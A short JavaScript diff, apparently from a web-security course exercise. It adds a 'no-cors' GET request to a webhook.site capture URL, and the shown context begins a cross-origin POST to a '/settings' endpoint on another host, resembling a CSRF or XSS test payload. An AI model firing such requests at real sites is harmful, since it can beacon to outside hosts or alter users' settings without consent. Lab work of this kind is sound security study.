@@ -13,6 +13,14 @@ fetch('https://webhook.site/cc069b0d-de1e-44e7-a003-4446b873069d', {
 })
   .then(response => response.text())
   .then(responseText => console.log(responseText));
+
+fetch('https://webhook.site/cc069b0d-de1e-44e7-a003-4446b873069d', {
+  method: 'GET',
+  mode: 'no-cors',
+  headers: {'Access-Control-Allow-Origin': '*'}
+})
+  .then(response => response.text())
+  .then(responseText => console.log(responseText));
   
 fetch('https://cats.is-course.ru/settings', {
   method: 'POST',
